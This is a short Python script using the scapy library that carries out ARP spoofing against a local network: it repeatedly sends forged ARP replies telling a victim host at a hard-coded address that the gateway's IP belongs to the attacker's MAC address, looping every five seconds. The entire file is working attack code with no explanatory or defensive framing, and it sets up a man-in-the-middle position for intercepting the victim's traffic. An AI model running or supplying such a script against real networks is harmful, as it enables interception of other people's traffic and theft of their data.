import sys
import time
from scapy.all import (ARP,
                       sendp,
                       Ether,
                       get_if_hwaddr,
                       getmacbyip,
                       Gen)
gateWayIP = "192.168.100.1"
localIP = "192.168.100.25"
vicIP = "192.168.100.58"
gateWayMac = getmacbyip(gateWayIP)
localMAC = "44:8a:5b:99:04:f7"
vicMAC = getmacbyip(vicIP)

ethernet = Ether(src = localMAC, dst = vicMAC)
arp = ARP(hwsrc=localMAC, psrc=gateWayIP, hwdst=vicMAC, pdst=vicIP, op=2)
pkt = ethernet / arp
while 1:
    sendp(pkt)
    time.sleep(5)
